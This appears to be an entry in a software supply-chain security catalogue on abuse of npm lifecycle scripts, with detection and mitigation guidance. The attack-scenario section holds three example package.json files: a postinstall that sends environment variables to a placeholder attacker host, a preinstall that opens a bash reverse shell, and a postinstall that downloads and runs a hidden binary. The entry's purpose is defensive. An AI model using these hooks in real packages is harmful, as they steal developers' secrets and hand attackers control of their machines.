---
name: "Lifecycle Script Abuse"
packageManager: "npm"
slug: "npm-lifecycle-scripts"
category: "Code Execution"
severity: "high"
platform:
  - "Linux"
  - "macOS"
  - "Windows"
description: "npm packages can define lifecycle scripts such as preinstall, install, postinstall, and prepare. npm 11 and earlier normally ran dependency install scripts during installation unless scripts were disabled. npm 12 changed the default: dependency install scripts are blocked unless the project or user explicitly approves them. Scripts can still execute on older clients, through an approval, when policy is bypassed, or when a user intentionally invokes a package script. Current npm CLIs do not implement uninstall lifecycle scripts."
descriptionCitations: [1, 2, 3, 4, 5, 6, 7, 8]
prerequisites:
  - "Ability to publish a package to the npm registry or compromise an existing one"
  - "The target uses npm 11 or earlier, approves the dependency's script under npm 12, or bypasses the npm 12 script policy"
prerequisitesCitations: [1, 2, 3, 4, 5, 6, 7, 8]
attackScenarios:
  - title: "Malicious postinstall Script Exfiltrating Credentials"
    description: "An attacker publishes a package with a postinstall script that collects sensitive environment variables and sends them to an attacker-controlled server. The script runs automatically on npm 11 and earlier unless disabled; on npm 12 it requires approval or a policy bypass."
    citations: [1, 2, 3, 4, 5, 6, 7, 8]
    commands:
      - label: "Malicious package.json with postinstall hook"
        code: |
          {
            "name": "helpful-utility-pkg",
            "version": "1.0.0",
            "scripts": {
              "postinstall": "curl -s https://evil.example.com/collect?data=$(env | base64 -w0)"
            }
          }
        language: "json"
  - title: "Reverse Shell via preinstall Script"
    description: "A preinstall script can establish a reverse shell when the dependency's install scripts are permitted. npm 12 blocks an unapproved dependency script by default, while older clients and explicitly approved packages remain exposed."
    citations: [1, 2, 3, 4, 5, 6, 7, 8]
    commands:
      - label: "package.json with reverse shell payload"
        code: |
          {
            "name": "legit-looking-lib",
            "version": "2.0.0",
            "scripts": {
              "preinstall": "node -e \"require('child_process').exec('bash -i >& /dev/tcp/attacker.example.com/4444 0>&1')\""
            }
          }
        language: "json"
  - title: "Persistence via postinstall Malware Download"
    description: "A permitted postinstall script can download a compiled binary and add persistence outside the package directory. Historical npm supply-chain incidents used install-time scripts; npm 12's default-deny dependency script policy reduces this path but does not protect older clients or scripts that a user approves."
    citations: [1, 2, 3, 4, 5, 6, 7, 8]
    commands:
      - label: "package.json that downloads and executes a payload"
        code: |
          {
            "name": "event-handler-utils",
            "version": "1.2.3",
            "scripts": {
              "postinstall": "curl -sL https://evil.example.com/payload -o /tmp/.cache_worker && chmod +x /tmp/.cache_worker && /tmp/.cache_worker &"
            }
          }
        language: "json"
detection:
  - title: "Inspect Package Contents Before Installing"
    description: "Use `npm pack --ignore-scripts` to fetch a registry tarball while disabling package.json scripts, then inspect the archived manifest before installation. Plain `npm pack` supports lifecycle scripts, so the flag is material to this inspection workflow."
    citations: [1, 2, 3, 4, 5, 6, 7, 8]
    commands:
      - code: |
          PACKAGE=lodash
          VERSION=4.17.21
          npm pack --ignore-scripts "$PACKAGE@$VERSION"
          tar -xzf *.tgz && cat package/package.json | grep -A 10 '"scripts"'
        language: "bash"
      - code: "npm view lodash@4.17.21 scripts --json"
        language: "bash"
  - title: "Review npm 12 Script Approvals"
    description: "On npm 12, list dependencies with unreviewed install scripts and approve only the exact packages and versions that require them. On older npm releases, --ignore-scripts remains the broad control for suppressing package scripts during installation."
    citations: [1, 2, 3, 4, 5, 6, 7, 8]
    commands:
      - code: |
          npm install-scripts ls
          npm install --ignore-scripts
        language: "bash"
  - title: "Inspect Lifecycle Scripts with Static Analysis"
    description: "Inspect package manifests and tarballs for lifecycle scripts before installation. `npm audit` reports known vulnerabilities through the configured registry's audit endpoint; it does not generally identify a previously unknown malicious install script."
    citations: [1, 2, 3, 4, 5, 6, 7, 8]
    commands:
      - code: "npm view lodash@4.17.21 scripts --json"
        language: "bash"
mitigation:
  - "Use npm 12's default-deny script policy and commit version-pinned allowScripts approvals only after review"
  - "For npm 11 and earlier, use --ignore-scripts in CI unless a reviewed dependency requires an install script"
  - "Use manifest inspection or a purpose-built package scanner to review lifecycle scripts before installation"
  - "Pin exact dependency versions in package-lock.json and review changes to scripts on version bumps"
  - "Restrict network access during builds to prevent data exfiltration from install scripts"
mitigationCitations: [1, 2, 3, 4, 5, 6, 7, 8]
references:
  - title: "eslint-scope Incident Postmortem"
    url: "https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes"
  - title: "event-stream Supply Chain Attack Analysis"
    url: "https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident"
  - title: "Socket Security - GitHub App"
    url: "https://github.com/apps/socket-security"
  - title: "npm Lifecycle Scripts Documentation"
    url: "https://docs.npmjs.com/cli/v12/using-npm/scripts"
  - title: "npm audit Documentation"
    url: "https://docs.npmjs.com/cli/v12/commands/npm-audit/"
  - title: "npm pack Documentation"
    url: "https://docs.npmjs.com/cli/commands/npm-pack/"
  - title: "npm Install Script Approvals"
    url: "https://docs.npmjs.com/cli/v12/commands/npm-install-scripts/"
  - title: "GitHub - npm 12 Install-Time Security Defaults"
    url: "https://github.blog/changelog/2026-07-08-npm-install-time-security-and-gat-bypass2fa-deprecation/"
historicalNotes:
  - date: "30 April, 2026"
    note: >-
      Updated the overview to remove the outdated preuninstall example and
      align the page with current npm behavior, where uninstall lifecycle
      scripts are not implemented in modern npm versions. Source:
      <a href="https://docs.npmjs.com/cli/v12/using-npm/scripts/" target="_blank" rel="noopener">npm Docs - Scripts (v12)</a>.
created: 2026-04-02
updated: 2026-10-14
---
